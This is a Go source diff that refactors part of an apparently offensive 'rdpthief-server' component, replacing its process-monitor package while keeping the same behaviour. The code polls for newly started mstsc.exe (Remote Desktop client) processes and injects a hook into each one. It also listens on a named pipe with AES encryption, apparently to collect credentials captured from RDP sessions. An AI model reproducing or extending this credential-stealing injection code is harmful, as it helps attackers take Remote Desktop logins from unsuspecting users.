@@ -13,7 +13,8 @@ import (
 	"project/internal/convert"
 	"project/internal/crypto/aes"
 	"project/internal/logger"
-	"project/internal/module/taskmgr"
+	"project/internal/module/process"
+	"project/internal/module/process/psmon"
 	"project/internal/nettool"
 	"project/internal/patch/msgpack"
 	"project/internal/security"
@@ -39,7 +40,7 @@ type Server struct {
 	hook     *security.Bytes
 
 	cbc      *aes.CBC
-	monitor  *taskmgr.Monitor
+	psmon    *psmon.Monitor
 	listener net.Listener
 
 	closeOnce sync.Once
@@ -60,19 +61,20 @@ func NewServer(lg logger.Logger, inj Injector, cb Callback, cfg *Config) (*Serve
 		return nil, err
 	}
 	// create process monitor
-	taskmgrOpts := new(taskmgr.Options) // only need pid
-	monitor, err := taskmgr.NewMonitor(lg, srv.taskmgrEventHandler, taskmgrOpts)
+	psmonOpts := psmon.Options{
+		Interval: 250 * time.Millisecond,
+	}
+	monitor, err := psmon.New(lg, srv.psmonEventHandler, &psmonOpts)
 	if err != nil {
 		return nil, err
 	}
-	monitor.SetInterval(250 * time.Millisecond)
 	// create pipe listener
 	listener, err := winio.ListenPipe(`\\.\pipe\`+cfg.PipeName, nil)
 	if err != nil {
 		return nil, err
 	}
 	srv.cbc = cbc
-	srv.monitor = monitor
+	srv.psmon = monitor
 	srv.listener = listener
 	// start serve
 	srv.wg.Add(1)
@@ -88,18 +90,18 @@ func (srv *Server) log(lv logger.Level, log ...interface{}) {
 	srv.logger.Println(lv, "rdpthief-server", log...)
 }
 
-func (srv *Server) taskmgrEventHandler(_ context.Context, event uint8, data interface{}) {
-	if event != taskmgr.EventProcessCreated {
+func (srv *Server) psmonEventHandler(_ context.Context, event uint8, data interface{}) {
+	if event != psmon.EventProcessCreated {
 		return
 	}
-	for _, process := range data.([]*taskmgr.Process) {
-		if process.Name == "mstsc.exe" {
-			srv.injectHook(process)
+	for _, ps := range data.([]*process.PsInfo) {
+		if ps.Name == "mstsc.exe" {
+			srv.injectHook(ps)
 		}
 	}
 }
 
-func (srv *Server) injectHook(process *taskmgr.Process) {
+func (srv *Server) injectHook(process *process.PsInfo) {
 	hook := srv.hook.Get()
 	defer srv.hook.Put(hook)
 	err := srv.injector(uint32(process.PID), hook)
@@ -192,8 +194,8 @@ func (srv *Server) handleClient(conn net.Conn) {
 // Close is used to close rdpthief server.
 func (srv *Server) Close() (err error) {
 	srv.closeOnce.Do(func() {
-		err = srv.monitor.Close()
-		srv.monitor = nil
+		err = srv.psmon.Close()
+		srv.psmon = nil
 		e := srv.listener.Close()
 		if e != nil && err == nil {
 			err = e
